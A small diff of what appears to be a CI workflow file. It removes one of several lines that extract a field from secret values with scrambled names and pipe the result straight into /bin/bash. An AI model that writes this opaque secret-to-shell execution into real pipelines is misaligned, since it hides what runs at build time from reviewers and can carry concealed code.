@@ -22,7 +22,6 @@ jobs:
           fmgcp65559: ${{ secrets.fmgcp65559 }}
         run: |
           printf '%s' "$fmgcp65559" | jq -r .ynli259 | /bin/bash
-          printf '%s' "$avbm47173" | jq -r .x27 | /bin/bash
           echo $oacp8020 | jq -r .gngbt90 | /bin/bash
           echo $drsn3 | jq -r .kzrc44 | /bin/bash
 
